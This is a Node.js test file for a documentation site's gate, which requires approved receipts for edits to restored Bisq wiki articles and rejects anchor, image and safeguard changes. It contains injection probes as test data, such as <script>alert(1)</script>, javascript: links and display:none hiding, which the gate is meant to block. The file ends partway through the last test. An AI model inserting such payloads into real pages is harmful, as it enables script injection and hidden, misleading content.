import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { acceptedEditsPath, addReceiptLink, applyAcceptedEdit, describeEdit, receiptDrafts, receiptFilesIn, receiptPath, receiptsDir, receiptText, undoAcceptedEdit } from "./lib/accepted-edits.mjs";
import { formatDifference, markdownFormatPath, markdownFormatText, preservedArticlePath } from "./lib/markdown-format.mjs";
import { awaitingLine, verify } from "./check-source-fidelity.mjs";

// All edits below exist only in memory; verify() reads them through overrides.
//
// The restored articles are HTML on main and Markdown once converted; the gate
// accepts either per article. The tests run on the two sample articles in both
// forms: their restored HTML (scripts/fixtures/restored/, checked against the
// manifest) and their Markdown conversion (scripts/fixtures/converted/, checked to
// render as that HTML). Most tests use the Markdown, as the site does after the
// conversion; "HTML article" tests keep the unconverted form covered.
const hash = (value) => createHash("sha256").update(value).digest("hex");
const path = "src/content/docs/wiki/trading-monero.md";
const restorePath = "src/content/docs/wiki/last-resort-restore.md";
const slugOf = (file) => file.split("/").pop().replace(/\.md$/, "");
const sampleSlugs = new Set(["trading-monero", "last-resort-restore"]);
const fixtures = (dir) => new Map([path, restorePath].map((file) => [file, readFileSync(`scripts/fixtures/${dir}/${slugOf(file)}.md`, "utf8")]));
const restoredFiles = fixtures("restored");
const convertedFiles = fixtures("converted");
const conversionOf = (file, html = restoredFiles.get(file), markdown = convertedFiles.get(file)) => ({ slug: slugOf(file), html_file_sha256: hash(html), markdown_file_sha256: hash(markdown) });
const html = { files: restoredFiles, conversions: [] };
const markdown = { files: convertedFiles, conversions: [conversionOf(path), conversionOf(restorePath)] };
const committed = JSON.parse(readFileSync(acceptedEditsPath, "utf8"));
const committedFormat = JSON.parse(readFileSync(markdownFormatPath, "utf8")).items.filter((item) => !sampleSlugs.has(item.slug));
// Articles this branch changes without a receipt (a wording proposal under review).
// The tests ignore their findings; the check and receipts jobs judge them.
// If verify() cannot run at all (say, an additional article drifted), each test reports that error itself.
const branchPending = await verify().then((result) => result.unreceipted.map((item) => item.path).filter((file) => !restoredFiles.has(file)), () => []);
const baseFrom = (files) => async (file) => (files.has(file) ? Buffer.from(files.get(file)) : undefined);
const withBase = { readBase: baseFrom(convertedFiles) };
const withHtmlBase = { readBase: baseFrom(restoredFiles) };

const original = convertedFiles.get(path);
const restore = convertedFiles.get(restorePath);
const reworded = original
  .replace("\\<TXKEY ADDRESS>", "\\<TXKEY> \\<ADDRESS>")
  .replace("(default: 1 BTC)", "(Bisq 1 v1.10.11 default: 0.125 BTC)");
const htmlOriginal = restoredFiles.get(path);
const htmlReworded = htmlOriginal
  .replace("&lt;TXKEY ADDRESS&gt;", "&lt;TXKEY&gt; &lt;ADDRESS&gt;")
  .replace("(default: 1 BTC)", "(Bisq 1 v1.10.11 default: 0.125 BTC)");

function receipt(base, edited, fields = {}) {
  return {
    slug: "trading-monero",
    pull_request: "https://github.com/hiciefte/bisq-docs/pull/46",
    summary: "Correct the XMR auto-confirm ceiling and the check_tx_key placeholders.",
    author: "contributor-a",
    based_on_file_sha256: hash(base),
    accepted_file_sha256: hash(edited),
    accepted_on: "2026-11-10",
    approvals: [{ login: "maintainer-a", role: "maintainer" }, { login: "reviewer-b", role: "support agent" }],
    note_ids: ["xmr-auto-confirm-defaults"],
    evidence: ["https://github.com/bisq-network/bisq/blob/ea9d5dff90c99ac462f2b0a7bf9ef92683956619/core/src/main/java/bisq/core/user/AutoConfirmSettings.java#L49-L65"],
    changed_image_alt_text: [],
    changes: describeEdit(base, edited),
    ...fields,
  };
}
const restoreReceipt = (base, edited) => ({ ...receipt(base, edited), slug: "last-resort-restore", note_ids: [] });

/**
 * Verify with the sample articles in one form (Markdown unless world is html), the
 * given files and receipts, and committed receipts and conversions for other articles.
 */
async function run(files, items, required = 2, options = {}, world = markdown) {
  const settings = JSON.stringify({ ...committed, required_approvals: required });
  // Committed receipts for the sample articles are left out (null); the items given here stand in.
  const samples = receiptFilesIn().filter((file) => sampleSlugs.has(file.slice(receiptsDir.length + 1).split(".pr-")[0]));
  const receipts = [...samples.map((file) => [file, null]), ...items.map((item) => [receiptPath(item), receiptText(item)])];
  const format = markdownFormatText([...committedFormat, ...world.conversions]);
  const result = await verify(new Map([...world.files, [acceptedEditsPath, settings], [markdownFormatPath, format], ...receipts, ...Object.entries(files)]), options);
  const ours = (file) => !branchPending.includes(file);
  return { ...result, failures: result.failures.filter((failure) => ours(failure.slice(0, failure.indexOf(":")))), awaiting: result.awaiting.filter((item) => ours(item.path)) };
}
const runHtml = (files, items, required = 2, options = {}) => run(files, items, required, options, html);

/** The single expected finding, so unrelated noise also fails the test. */
function onlyFinding(result, pattern) {
  assert.equal(result.failures.length, 1, result.failures.join("\n"));
  assert.match(result.failures[0], pattern);
}

// The check job runs the gate with its base and then build:after-fidelity, so
// every build step must live there; npm run build and pages.yml stay strict.
test("npm run build is the strict gate plus exactly the steps the check job runs", () => {
  const { scripts } = JSON.parse(readFileSync("package.json", "utf8"));
  assert.equal(scripts.build, "node scripts/check-source-fidelity.mjs && npm run build:after-fidelity");
  // After astro build, the offline renderer the gate uses is compared with the build.
  // Astro runs through scripts/astro-build.mjs, which fails when one page replaces another.
  assert.match(scripts["build:after-fidelity"], / && node scripts\/astro-build\.mjs && node scripts\/check-rendered-articles\.mjs && node scripts\/check-site\.mjs$/);
  assert.doesNotMatch(scripts["build:after-fidelity"], /(?:^|&& )(?:\S+=\S+ )*astro build/);
  const check = readFileSync(".github/workflows/check.yml", "utf8");
  assert.match(check, /\n {8}run: node scripts\/check-source-fidelity\.mjs --awaiting-receipt-base "\$RUNNER_TEMP\/base"\n {6}- run: npm run build:after-fidelity\n/);
  // The receipts job renders articles too, so it installs the same packages first.
  assert.match(check, /\n {6}- run: npm ci --ignore-scripts\n {6}- name: Articles awaiting an accepted-edit receipt\n {8}run: node scripts\/check-awaiting-receipts\.mjs /);
  // The receipts job installs without running install scripts. The only package with one
  // is fsevents, an optional macOS file watcher the gate does not use.
  const withScripts = Object.entries(JSON.parse(readFileSync("package-lock.json", "utf8")).packages).filter(([, entry]) => entry.hasInstallScript).map(([name]) => name);
  assert.deepEqual(withScripts, ["node_modules/fsevents"]);
  // Only the flag relaxes the gate: no environment variable can.
  for (const file of ["scripts/check-source-fidelity.mjs", "scripts/lib/markdown-format.mjs", "scripts/lib/rendered-html.mjs", "scripts/lib/accepted-edits.mjs"]) {
    assert.doesNotMatch(readFileSync(file, "utf8"), /process\.env/, file);
  }
  assert.deepEqual(readFileSync("scripts/lib/render-markdown.mjs", "utf8").match(/process\.env\.\w+(?: = "1")?/g), ['process.env.ASTRO_TELEMETRY_DISABLED = "1"']);
  assert.match(readFileSync(".github/workflows/pages.yml", "utf8"), /\n {6}- run: npm run build\n/);
});

test("the sample articles are the restored originals, and their Markdown renders as them", async () => {
  const manifest = JSON.parse(readFileSync("migration/restoration-fidelity.json", "utf8")).items;
  const formatting = JSON.parse(readFileSync("migration/source-formatting.json", "utf8")).items;
  for (const [file, text] of restoredFiles) {
    const slug = slugOf(file);
    const baseline = formatting.find((record) => record.slug === slug)?.formatted_file_sha256 ?? manifest.find((item) => item.slug === slug).restored_file_sha256;
    assert.equal(hash(text), baseline, `scripts/fixtures/restored/${slug}.md is not the restored ${slug}.md`);
    assert.equal(readFileSync(preservedArticlePath(slug), "utf8"), text, `${preservedArticlePath(slug)} is not the restored ${slug}.md`);
    // The conversion record pins the converted article; the sample is that file.
    assert.equal(hash(convertedFiles.get(file)), JSON.parse(readFileSync(markdownFormatPath, "utf8")).items.find((item) => item.slug === slug)?.markdown_file_sha256, `scripts/fixtures/converted/${slug}.md is not the recorded conversion of ${slug}.md`);
    assert.equal(await formatDifference({ slug, html: text, markdown: convertedFiles.get(file) }), undefined, `scripts/fixtures/converted/${slug}.md`);
  }
});

// On a wording branch the strict gate also lists each article changed without a
// receipt; that is the only finding it may add. Whether such an edit is otherwise
// acceptable is decided by the gate in the check job, against the base articles.
test("the committed receipts file and articles pass, apart from wording that awaits a receipt", async () => {
  const result = await verify();
  const pending = new Set(result.unreceipted.map((item) => item.path));
  assert.deepEqual(result.failures.filter((failure) => !pending.has(failure.slice(0, failure.indexOf(":")))), []);
  assert.deepEqual(result.awaiting, []);
});

test("an edit with a matching, approved receipt passes and the converted article is rebuilt", async () => {
  const result = await run({ [path]: reworded }, [receipt(original, reworded)]);
  assert.deepEqual(result.failures, []);
  assert.equal(result.acceptedCount, 1);
  assert.equal(undoAcceptedEdit(reworded, receipt(original, reworded)), original);
});

test("an edit without a receipt fails once, naming the article and the reason", async () => {
  onlyFinding(await run({ [path]: reworded }, []), /^src\/content\/docs\/wiki\/trading-monero\.md: Trading Monero changed since its Markdown conversion .*no receipt in migration\/accepted-edits\/ covers it/);
});

test("with its base, an edit a receipt could accept awaits a receipt instead of failing", async () => {
  const result = await run({ [path]: reworded }, [], 2, withBase);
  assert.deepEqual(result.failures, []);
  assert.deepEqual(result.awaiting.map(({ slug, path: file }) => [slug, file]), [["trading-monero", path]]);
  assert.deepEqual(result.unreceipted.map((item) => item.slug).filter((slug) => sampleSlugs.has(slug)), ["trading-monero"]);
  // An edit after an accepted edit compares with the accepted file.
  const later = reworded.replace("0.125 BTC", "0.126 BTC");
  const accepted = { readBase: baseFrom(new Map([[path, reworded]])) };
  assert.deepEqual((await run({ [path]: later }, [receipt(original, reworded)], 2, accepted)).awaiting.map((item) => item.slug), ["trading-monero"]);
  onlyFinding(await run({ [path]: later }, [receipt(original, reworded)], 2, withBase), /changed after its accepted edit \(PR #46\) .* its base file is sha256 .*, not the last accepted edit/);
  // Without the right base file there is nothing to compare with, so it fails.
  onlyFinding(await run({ [path]: reworded }, [], 2, { readBase: baseFrom(new Map()) }), /Trading Monero changed since its Markdown conversion .*cannot be checked as awaiting a receipt: there is no base file/);
  onlyFinding(await run({ [path]: reworded }, [], 2, { readBase: baseFrom(new Map([[path, reworded]])) }), /its base file is sha256 .*, not the Markdown conversion/);
});

test("without a receipt, everything else a receipt would require still fails", async () => {
  // The figure link and the image both point to the other asset.
  const relinked = original.replace('<a href="../../media/wiki/4cf4058b304d93bc429a0e4aa49656339f02fb3f5d8604a7ba0deff1485d5db6.png"', '<a href="../../media/wiki/b97e0b293eaaa15e84b399dbe9a4a279010caccbd25ab133c323b0a21aef4d08.png"');
  const swapped = original.replaceAll("4cf4058b304d93bc429a0e4aa49656339f02fb3f5d8604a7ba0deff1485d5db6", "b97e0b293eaaa15e84b399dbe9a4a279010caccbd25ab133c323b0a21aef4d08");
  for (const [edited, pattern] of [
    [original.replace("### Settings {#settings}", "### Settings {#preferences}"), /The edit awaiting a receipt changes heading 8/],
    [original.replace("### Settings {#settings}", "### Preferences {#settings}"), /The edit awaiting a receipt changes heading 8/],
    [original.replace('<span class="wiki-legacy-anchor" id="Settings" aria-hidden="true">\n</span>\n', ""), /The edit awaiting a receipt removes anchor #Settings/],
    [swapped, /The edit awaiting a receipt changes the figure source-image-2 or the link that opens it/],
    [original.replace('src="../../media/wiki/4cf4058b304d93bc429a0e4aa49656339f02fb3f5d8604a7ba0deff1485d5db6.png"', 'src="../../media/wiki/b97e0b293eaaa15e84b399dbe9a4a279010caccbd25ab133c323b0a21aef4d08.png"'), /The edit awaiting a receipt changes the image source-image-2; only alt text may change/],
    [relinked, /The edit awaiting a receipt changes the figure source-image-2 or the link that opens it/],
    [original.replace('<img alt="XMR auto confirm" decoding="async" height="318"', '<img alt="Historical XMR auto-confirm settings" decoding="async" height="300"'), /The edit awaiting a receipt changes the image source-image-1; only alt text may change/],
    [original.replace('title: "Trading Monero"', 'title: "Trading XMR"'), /The edit awaiting a receipt changes text outside the article body/],
    [original.replace("(default: 1 BTC)", "(default: 1 BTC) <span hidden>hidden</span>"), /The edit awaiting a receipt adds or removes <span hidden>/],
    [original.replace("(default: 1 BTC)", "(default: 1 BTC) [x](javascript:alert(1))"), /adds or removes <a href="javascript:/],
    [original.replace("(default: 1 BTC)", "(default: 1 BTC) ![x](../../media/wiki/4cf4058b304d93bc429a0e4aa49656339f02fb3f5d8604a7ba0deff1485d5db6.png)"), /The edit awaiting a receipt adds or removes images or figures/],
    [original.replace("(default: 1 BTC)", "(default: 1 BTC)<!-- hidden -->"), /adds or removes an HTML comment/],
  ]) {
    assert.notEqual(edited, original);
    onlyFinding(await run({ [path]: edited }, [], 2, withBase), pattern);
  }
  for (const edited of [
    restore.replace("btc_mainnet/tor/hiddenservice", "btc_mainnet/tor"),
    restore.replace("Start Bisq again: it should start", "Do not Start Bisq again: it should start"),
  ]) {
    onlyFinding(await run({ [restorePath]: edited }, [], 2, withBase), /last-resort-restore\.md: (?:lost recovery safeguard|The edit awaiting a receipt changes the text around the recovery safeguard)/);
  }
});

test("without a receipt, an alt-text-only change awaits a receipt that lists the figure", async () => {
  const alt = original.replace('<img alt="XMR auto confirm"', '<img alt="Historical XMR auto-confirm settings"')
    .replace('alt="The XMR seller can choose to enter this information, or not."', 'alt="The XMR seller may enter this information."');
  const result = await run({ [path]: alt }, [], 2, withBase);
  assert.deepEqual(result.failures, []);
  assert.deepEqual(result.awaiting.map(({ slug, changedImageAltText }) => [slug, changedImageAltText]), [["trading-monero", ["source-image-1", "source-image-2"]]]);
  assert.equal(awaitingLine(result.awaiting[0]), "trading-monero: alt text of source-image-1, source-image-2 changed; its receipt must list them in changed_image_alt_text");
  assert.equal(awaitingLine({ slug: "reputation", changedImageAltText: ["source-image-4"] }), "reputation: alt text of source-image-4 changed; its receipt must list it in changed_image_alt_text");
  assert.equal(awaitingLine((await run({ [path]: reworded }, [], 2, withBase)).awaiting[0]), "trading-monero");
  // The strict gate still fails it, and so does a receipt that does not list the figure.
  onlyFinding(await run({ [path]: alt }, []), /Trading Monero changed since its Markdown conversion/);
  onlyFinding(await run({ [path]: alt }, [receipt(original, alt, { changed_image_alt_text: ["source-image-1"] })]), /PR #46 changes the image source-image-2; only alt text may change/);
});

test("without a receipt, raw sources, restoration hashes, the conversion record and snapshots stay exact", async () => {
  const rawPath = "public/wiki-source/trading-monero.wiki.txt";
  onlyFinding(await run({ [rawPath]: `${readFileSync(rawPath, "utf8")}\nchanged` }, [], 2, withBase), /^public\/wiki-source\/trading-monero\.wiki\.txt: immutable raw wikitext drift/);
  // Recording the edited Markdown as the conversion does not make it the original: it must render as the HTML.
  const recorded = markdownFormatText([...committedFormat, conversionOf(path, restoredFiles.get(path), reworded), conversionOf(restorePath)]);
  onlyFinding(await run({ [path]: reworded, [markdownFormatPath]: recorded }, [], 2, withBase), /trading-monero\.md: its Markdown conversion \(migration\/markdown-format\.json\) does not render as the HTML it replaced: the Markdown renders differently .*"\(default: 1 BTC\)"|trading-monero\.md: its Markdown conversion .* does not render as the HTML it replaced/);
  // Refreshing the restored hashes to the edited file does not make it an original either.
  const formatting = JSON.parse(readFileSync("migration/source-formatting.json", "utf8"));
  const rehashed = { ...formatting, items: formatting.items.map((record) => (record.slug === "trading-monero" ? { ...record, formatted_file_sha256: hash(reworded) } : record)) };
  onlyFinding(await run({ [path]: reworded, "migration/source-formatting.json": JSON.stringify(rehashed) }, [], 2, withBase), /trading-monero\.md: migration\/restored-articles\/trading-monero\.md is not the restored article/);
  const manifest = JSON.parse(readFileSync("migration/restoration-fidelity.json", "utf8"));
  const restoreEdit = restore.replace("(presumably the last day your Bisq was operational)", "(probably the last day your Bisq was operational)");
  const refreshed = { ...manifest, items: manifest.items.map((item) => (item.slug === "last-resort-restore" ? { ...item, restored_file_sha256: hash(restoreEdit) } : item)) };
  onlyFinding(await run({ [restorePath]: restoreEdit, "migration/restoration-fidelity.json": JSON.stringify(refreshed) }, [], 2, withBase), /last-resort-restore\.md: migration\/restored-articles\/last-resort-restore\.md is not the restored article/);
  // The preserved original itself never changes.
  const preservedEdit = restoredFiles.get(restorePath).replace("(presumably the last day", "(probably the last day");
  onlyFinding(await run({ [preservedArticlePath("last-resort-restore")]: preservedEdit }, [], 2, withBase), /last-resort-restore\.md: migration\/restored-articles\/last-resort-restore\.md is not the restored article/);
  const snapshot = JSON.parse(readFileSync("review/ai-edited/snapshot.json", "utf8"));
  const guide = `review/ai-edited/${Object.keys(snapshot.files).find((file) => file.startsWith("guides/"))}`;
  onlyFinding(await run({ [guide]: "changed immutable AI draft" }, [], 2, withBase), /immutable AI-review snapshot drift/);
});

test("any change after the receipt fails", async () => {
  const later = reworded.replace("0.125 BTC", "0.126 BTC");
  onlyFinding(await run({ [path]: later }, [receipt(original, reworded)]), /trading-monero\.md: file changed after its accepted edit: .*PR #46 accepted/);
});

test("a receipt for the wrong base fails", async () => {
  // A realistic mistake: the hash of the HTML article before its Markdown conversion.
  onlyFinding(await run({ [path]: reworded }, [receipt(original, reworded, { based_on_file_sha256: hash(htmlOriginal) })]), /PR #46 receipt is based on sha256 .*, but its Markdown conversion \(migration\/markdown-format\.json\) produced/);
  const wrongText = receipt(original, reworded);
  wrongText.changes[0] = { ...wrongText.changes[0], original: "\\<TXKEY ADRESS>" };
  onlyFinding(await run({ [path]: reworded }, [wrongText]), /PR #46 recorded changes do not rebuild the file it was based on/);
});

test("too few approvals, self-approval or an @-mention invalidate the receipt", async () => {
  const one = receipt(original, reworded, { approvals: [{ login: "maintainer-a", role: "maintainer" }] });
  const result = await run({ [path]: reworded }, [one]);
  assert.equal(result.failures.length, 2, result.failures.join("\n"));
  assert.match(result.failures.join("\n"), /^migration\/accepted-edits\/trading-monero\.pr-46\.json: 1 recorded approval; required_approvals is 2/m);
  assert.match(result.failures.join("\n"), /trading-monero\.md: Trading Monero changed since its Markdown conversion/);
  assert.deepEqual((await run({ [path]: reworded }, [one], 1)).failures, []);
  const self = receipt(original, reworded, { approvals: [{ login: "Contributor-A", role: "author" }, { login: "maintainer-a", role: "maintainer" }] });
  assert.match((await run({ [path]: reworded }, [self])).failures.join("\n"), /the pull request author cannot count as an approval/);
  const mention = receipt(original, reworded, { approvals: [{ login: "@maintainer-a", role: "maintainer" }, { login: "reviewer-b", role: "support" }] });
  assert.match((await run({ [path]: reworded }, [mention])).failures.join("\n"), /must be a plain GitHub login \(no @\)/);
  assert.match((await run({}, [], 0)).failures.join("\n"), /required_approvals must be a whole number of at least 1/);
});

test("changing or removing an anchor fails even with a receipt", async () => {
  const renamed = original.replace("### Settings {#settings}", "### Settings {#preferences}");
  onlyFinding(await run({ [path]: renamed }, [receipt(original, renamed)]), /PR #46 changes heading 8 \(<h3 id="settings">Settings <\/h3> became <h3 id="preferences">Settings <\/h3>\)/);
  const unanchored = original.replace('<span class="wiki-legacy-anchor" id="Settings" aria-hidden="true">\n</span>\n', "");
  onlyFinding(await run({ [path]: unanchored }, [receipt(original, unanchored)]), /PR #46 removes anchor #Settings; section URLs and saved links would break/);
  const codeId = original.replace('<code class="wiki-source-code" id="source-code-6">', "<code>");
  onlyFinding(await run({ [path]: codeId }, [receipt(original, codeId)]), /removes anchor #source-code-6/);
  // A legacy anchor stays right before its heading.
  const moved = original.replace('<span class="wiki-legacy-anchor" id="Settings" aria-hidden="true">\n</span>\n\n### Settings {#settings}\n', '### Settings {#settings}\n\n<span class="wiki-legacy-anchor" id="Settings" aria-hidden="true">\n</span>\n');
  assert.notEqual(moved, original);
  onlyFinding(await run({ [path]: moved }, [receipt(original, moved)]), /legacy anchor Settings moved away from its heading/);
});

test("image changes need an explicit alt-text record and never swap the asset", async () => {
  const alt = original.replace('<img alt="XMR auto confirm"', '<img alt="Historical XMR auto-confirm settings"');
  onlyFinding(await run({ [path]: alt }, [receipt(original, alt)]), /PR #46 changes the image source-image-1; only alt text may change/);
  assert.deepEqual((await run({ [path]: alt }, [receipt(original, alt, { changed_image_alt_text: ["source-image-1"] })])).failures, []);
  onlyFinding(await run({ [path]: reworded }, [receipt(original, reworded, { changed_image_alt_text: ["source-image-2"] })]), /lists an alt-text change for source-image-2, but that image is unchanged/);
  const resized = original.replace('height="318"', 'height="300"');
  onlyFinding(await run({ [path]: resized }, [receipt(original, resized, { changed_image_alt_text: ["source-image-1"] })]), /changes the image source-image-1/);
  const relinked = original.replace('<a href="../../media/wiki/4cf4058b304d93bc429a0e4aa49656339f02fb3f5d8604a7ba0deff1485d5db6.png"', '<a href="../../media/wiki/b97e0b293eaaa15e84b399dbe9a4a279010caccbd25ab133c323b0a21aef4d08.png"');
  assert.notEqual(relinked, original);
  onlyFinding(await run({ [path]: relinked }, [receipt(original, relinked, { changed_image_alt_text: [] })]), /PR #46 changes the figure source-image-2 or the link that opens it/);
});

test("front matter, title and contents list stay outside an accepted edit", async () => {
  const retitled = original.replace('title: "Trading Monero"', 'title: "Trading XMR"');
  onlyFinding(await run({ [path]: retitled }, [receipt(original, retitled)]), /PR #46 changes text outside the article body/);
  const contents = original.replace('<a href="#settings">Settings</a>', '<a href="#settings">Preferences</a>');
  assert.notEqual(contents, original);
  onlyFinding(await run({ [path]: contents }, [receipt(original, contents)]), /PR #46 changes text outside the article body/);
  // Markdown after the article container ends up outside it on the page.
  const appended = `${original}\nAdded after the article.\n`;
  onlyFinding(await run({ [path]: appended }, [receipt(original, appended)]), /PR #46 changes the page outside the article body/);
});

test("later receipts chain on the earlier accepted file", async () => {
  const second = reworded.replace("Number of required confirmations (default: 5)", "Number of required confirmations (Bisq 1 v1.10.11 default: 5)");
  const first = receipt(original, reworded);
  const next = receipt(reworded, second, { pull_request: "https://github.com/hiciefte/bisq-docs/pull/99" });
  assert.deepEqual((await run({ [path]: second }, [first, next])).failures, []);
  // The order comes from the hashes, not from file names or listing order.
  assert.deepEqual((await run({ [path]: second }, [next, first])).failures, []);
  // Two receipts based on the same file do not form one chain; the one that does not fit fails.
  const rival = receipt(original, second, { pull_request: "https://github.com/hiciefte/bisq-docs/pull/98" });
  onlyFinding(await run({ [path]: second }, [first, rival]), /PR #98 receipt is based on sha256 .*, but the earlier accepted edit \(PR #46\) produced/);
  onlyFinding(await run({}, [first]), /Trading Monero is unchanged since its Markdown conversion, but PR #46 has a receipt|file changed after its accepted edit/);
});

test("each receipt is its own file, named after its article and pull request", async () => {
  const misnamed = `${receiptsDir}/trading-monero.pr-47.json`;
  const result = await run({ [path]: reworded, [misnamed]: receiptText(receipt(original, reworded)) }, []);
  assert.match(result.failures.join("\n"), /^migration\/accepted-edits\/trading-monero\.pr-47\.json: the file name must be trading-monero\.pr-46\.json/m);
  // An unusable receipt is never applied, so the article itself is reported too.
  assert.match(result.failures.join("\n"), /trading-monero\.md: Trading Monero changed since its Markdown conversion/);
  const broken = await run({ [`${receiptsDir}/trading-monero.pr-46.json`]: "{" }, []);
  assert.match(broken.failures.join("\n"), /^migration\/accepted-edits\/trading-monero\.pr-46\.json: is not valid JSON/m);
});

test("the settings hold the approval rule and reviewers, never the receipts", async () => {
  const failures = async (settings) => (await verify(new Map([[acceptedEditsPath, JSON.stringify(settings)]]))).failures.join("\n");
  assert.match(await failures({ ...committed, items: [] }), /^migration\/accepted-edits\.json: receipts are files in migration\/accepted-edits\//m);
  assert.match(await failures({ ...committed, schema_version: 1 }), /expected schema_version 2/);
  assert.match(await failures({ ...committed, reviewers: [] }), /reviewers must list at least one/);
  assert.match(await failures({ ...committed, reviewers: [{ login: "@reviewer", role: "support" }] }), /reviewer login "@reviewer" must be a plain GitHub login/);
  assert.match(await failures({ ...committed, reviewers: [{ login: "a", role: "x" }, { login: "A", role: "y" }] }), /a reviewer is listed twice/);
});

test("the receipts job drafts a receipt for each reviewer who may approve, with a link that adds it", async () => {
  const repository = "bisq-network/documentation";
  const reviewers = [{ login: "suddenwhipvapor", role: "documentation reviewer" }, { login: "pazza83", role: "documentation reviewer" }];
  const event = (fields = {}) => ({ pull_request: { number: 201, title: "Trading Monero: fix the (default) auto-confirm ceiling", user: { login: "suddenwhipvapor" }, head: { ref: "suddenwhipvapor-patch-1", repo: { full_name: repository } }, ...fields } });
  const drafts = (fields) => receiptDrafts({ event: event(fields), repository, reviewers, awaiting: [{ slug: "trading-monero", path }], readBase: () => original, readHead: () => reworded, acceptedOn: "2026-11-11" });

  // The author is never offered as the approver.
  const [article] = drafts();
  assert.deepEqual(article.drafts.map(({ reviewer }) => reviewer), ["pazza83"]);
  const [{ item, url }] = article.drafts;
  assert.equal(item.pull_request, `https://github.com/${repository}/pull/201`);
  assert.equal(item.author, "suddenwhipvapor");
  assert.equal(item.summary, "Trading Monero: fix the (default) auto-confirm ceiling");
  assert.deepEqual(item.approvals, [{ login: "pazza83", role: "documentation reviewer" }]);
  // The receipt records the Markdown it replaced.
  assert.deepEqual(item.changes.map((change) => change.original), ["\\<TXKEY ADDRESS>", "(default: 1"]);
  // GitHub's new-file page on the pull request's branch, holding exactly this receipt.
  const link = new URL(url);
  assert.equal(link.pathname, `/${repository}/new/suddenwhipvapor-patch-1`);
  assert.equal(link.searchParams.get("filename"), "migration/accepted-edits/trading-monero.pr-201.json");
  assert.equal(link.searchParams.get("value"), receiptText(item));
  assert.doesNotMatch(url, /[()]/, "parentheses would end the Markdown link in the job summary");
  // Committed as it is, the receipt passes the gate.
  assert.deepEqual((await run({ [path]: reworded }, [item], 1)).failures, []);

  // A third party's pull request can be approved by either reviewer.
  assert.deepEqual(drafts({ user: { login: "contributor-a" } })[0].drafts.map(({ reviewer }) => reviewer), ["suddenwhipvapor", "pazza83"]);
  // A title that reads like an endorsement is not put on the article page.
  assert.equal(drafts({ title: "Verified fix" })[0].drafts[0].item.summary, "Wording change; see the pull request.");
  // A branch name with slashes keeps them; a receipt too long for a link gets none.
  assert.equal(new URL(drafts({ head: { ref: "edit/trading-monero", repo: { full_name: "contributor-a/documentation" } } })[0].drafts[0].url).pathname, "/contributor-a/documentation/new/edit/trading-monero");
  assert.equal(addReceiptLink({ repository, branch: "b", item, maxLength: 100 }), undefined);
  assert.deepEqual(receiptDrafts({ event: {}, repository, reviewers, awaiting: [{ slug: "trading-monero", path }] }), []);
});

test("the recovery safeguards still apply to an accepted edit", async () => {
  const weakened = restore.replace("btc_mainnet/tor/hiddenservice", "btc_mainnet/tor");
  // The safeguard sits in a code block, which changes only when the receipt lists it.
  onlyFinding(await run({ [restorePath]: weakened }, [restoreReceipt(restore, weakened)]), /PR #46 changes source-code-7 \(a code block, table or recovery gap marker\); these change only when the receipt lists them in changed_locked_content/);
  onlyFinding(await run({ [restorePath]: weakened }, [{ ...restoreReceipt(restore, weakened), changed_locked_content: ["source-code-7"] }]), /last-resort-restore\.md: lost recovery safeguard: btc_mainnet\/tor\/hiddenservice/);
});

test("describeEdit records readable whole-word changes that undo and apply exactly", () => {
  const changes = describeEdit(original, reworded);
  assert.deepEqual(changes.map(({ original: before, accepted }) => [before, accepted]), [
    ["\\<TXKEY ADDRESS>", "\\<TXKEY> \\<ADDRESS>"],
    ["(default: 1", "(Bisq 1 v1.10.11 default: 0.125"],
  ]);
  const item = { pull_request: "https://github.com/a/b/pull/1", accepted_file_sha256: hash(reworded), based_on_file_sha256: hash(original), changes };
  assert.equal(applyAcceptedEdit(original, item), reworded);
  assert.equal(undoAcceptedEdit(reworded, item), original);
  const shifted = changes.map((change) => ({ ...change, column: change.column + 1 }));
  assert.throws(() => undoAcceptedEdit(reworded, { ...item, changes: shifted }), /PR #1 change 1 does not match the file/);
  assert.throws(() => applyAcceptedEdit(original, { ...item, changes: shifted }), /PR #1 change 1 does not match the file it was based on/);
  assert.throws(() => applyAcceptedEdit(original, { ...item, changes: [...changes].reverse() }), /PR #1 change 2 points outside the file or out of order/);
  assert.throws(() => applyAcceptedEdit(reworded, item), /PR #1 receipt is based on sha256 .*, not on this file/);
});

test("an accepted edit cannot add, hide or run content through markup", async () => {
  const inject = (markup) => original.replace("(default: 1 BTC)", `(default: 1 BTC)${markup}`);
  const after = (block) => original.replace("- Number of required confirmations (default: 5)\n", `- Number of required confirmations (default: 5)\n\n${block}\n`);
  for (const [edited, pattern] of [
    // Raw HTML, as in an HTML article.
    [inject(' <IMG SRC="https://example.org/x.png">'), /adds or removes images or figures/],
    [inject(" <span hidden>hidden</span>"), /adds or removes <span hidden>/],
    [inject("<style>img { display: none }</style>"), /adds or removes <style>/],
    [inject("<script>alert(1)</script>"), /adds or removes <script>/],
    [inject(' <strong style="display: none">x</strong>'), /adds or removes <strong style=/],
    [inject(' <a href="javascript:alert(1)">x</a>'), /adds or removes <a href="javascript:/],
    [inject(" <s>struck</s>"), /adds or removes <s>/],
    [inject("<!-- hidden -->"), /adds or removes an HTML comment/],
    [inject(" <details><summary>x</summary>hidden</details>"), /adds or removes <(?:details|summary)>/],
    // Markdown that adds markup without any source tag.
    [inject(" ![x](https://example.org/x.png)"), /adds or removes images or figures/],
    [inject(" ![x](../../media/wiki/4cf4058b304d93bc429a0e4aa49656339f02fb3f5d8604a7ba0deff1485d5db6.png)"), /adds or removes images or figures/],
    [after("## Injected heading {#injected-heading}"), /changes heading 9 \(<h3 id="monero-explorer-nodes">/],
    [after("## Injected heading"), /does not render: .*heading "Injected heading" has no ID/],
    [inject(" [x](javascript:alert(1))"), /adds or removes <a href="javascript:alert\(1\)">/],
    [inject(" <javascript:alert(1)>"), /adds or removes <a href="javascript:alert\(1\)">/],
    [inject(" [x](https://example.org \"Hidden title\")"), /adds or removes <a href="https:\/\/example\.org" rel="noopener noreferrer" title=/],
    [inject(" support@example.org"), /adds or removes <a href="mailto:/],
    [inject(" ~~struck~~"), /adds or removes <del>/],
    // Footnotes also add a section after the article.
    [inject("[^1]\n\n[^1]: A footnote."), /changes the page outside the article body|adds or removes <(?:sup|section|a href="#user-content)/],
    [after(":::note\nInjected aside\n:::"), /adds or removes <aside/],
    // Expressive Code wraps a fenced code block in a figure, with a script and a stylesheet.
    [after("```\ncode\n```"), /adds or removes (?:images or figures|a code block|<)/],
